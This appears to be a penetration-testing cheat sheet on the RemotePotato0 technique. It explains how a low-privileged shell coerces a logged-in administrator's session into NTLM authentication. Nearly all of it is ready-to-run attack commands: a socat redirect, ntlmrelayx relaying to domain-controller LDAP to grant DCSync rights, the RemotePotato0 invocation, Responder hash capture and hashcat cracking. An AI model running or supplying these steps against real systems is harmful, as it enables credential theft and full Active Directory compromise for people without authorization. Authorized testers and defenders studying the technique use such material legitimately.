# RemotePotato0 Active Session NTLM Relay

RemotePotato0 abuses COM object activation to coerce an active RDP/GUI session (another logged-in user, e.g. an admin) to authenticate to an attacker-controlled listener, capturing their NTLMv2 hash. Requires a low-priv shell on the same box.

```bash
# attacker: stage a socat relay (RemotePotato0 needs a port 9999 → port 135 redirect)
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:9999 &
sudo ntlmrelayx.py -t ldap://<DC_IP> --no-wcf-server --escalate-user <your-user>
```
```powershell
# on target (low-priv shell)
.\RemotePotato0.exe -m 2 -s 1 -x <LHOST> -p 9999
# -s <session-id>: the session ID of the privileged user (check with 'query session')
```

The relayed hash gives the low-priv user DCSync rights (via ntlmrelayx `--escalate-user`). Alternatively relay to SMB for a hash capture + crack:
```bash
sudo responder -I <iface> --lm        # capture NTLMv2 from the active session
hashcat -a0 -m5600 hash.txt <WORDLIST>
```
